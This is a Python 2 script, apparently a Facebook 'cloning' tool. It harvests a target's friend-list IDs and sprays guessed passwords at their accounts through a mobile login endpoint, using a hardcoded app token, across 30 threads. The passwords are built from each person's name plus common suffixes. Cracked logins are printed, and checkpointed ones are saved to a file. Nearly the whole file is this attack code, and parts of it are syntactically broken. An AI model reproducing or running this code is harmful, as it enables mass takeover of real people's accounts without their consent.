•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....RAJPUT BRAND....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m Rana Nadeem Rajput"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
        
def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo9
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRAJPUT BRAND\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			hack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
      else:
		print "\x1b[1;97mFill in correctly"
		pilih_phone()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94m[Rana]Please Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning Star Now...\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----Rana\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97mNadeem----»"
	print "\033[1;97m«--------------------Rana\033[1;92m▣\033[1;97mNadeem--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Indian Old ID')
	print "\033[1;97m«--------------------Rana\033[1;92m▣\033[1;97mNadeem--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Rana_Nadeem
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] +'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91m[Rana.Cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name']+'12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '11223344'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m[Rana.co]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = '0000'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = '00786786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[Rana.Hacked]\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRAJPUT BRAND\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»" #Dev:Rana_Nadeem
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
    print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """           
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═Don't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....RAJPUT BRAND....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;94m Rana Nadeem Rajput""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def mail():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo16
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Pakistan Old."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_mail()

def pilih_mail():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_mail()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•RAJPUT;94mRAJPUT BRAND\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			mail()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_mail()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----Rana\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97mNadeem----»"
	print "\033[1;97m«--------------------Rana\033[1;92m▣\033[1;97mNadeem--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m          Start Cloning Pakistan Old ')
	print "\033[1;97m«-----Rana\033[1;92m▣\033[1;97mNadeem----»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Rana_Nadeem
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['last_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name']+'786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name']+'0000'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name']+'1122'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRANA BRAND\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»" #Dev:Rana_Nadeem
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print ""╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
Don't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana Nadeem  RAJPUT BRAND....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Num.  Rana Nadeem Rajput
              \033[1;94m +923082503426"""
              
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def isi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo17
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID RAJPUT BRAND"
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_isi()

def pilih_isi():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_isi()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRAJPUT BRAND\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			isi()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_isi()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«---Rana\033[1;92m▣\033[1;97mNadeem----»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m          Start Cloning RAJPUT BRAND')
	print "\033[1;97m«----Rana\033[1;92m▣\033[1;97mNadeem----»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Rana_Nadeem
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+b['middle_name']+b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'0000'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']+'786786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
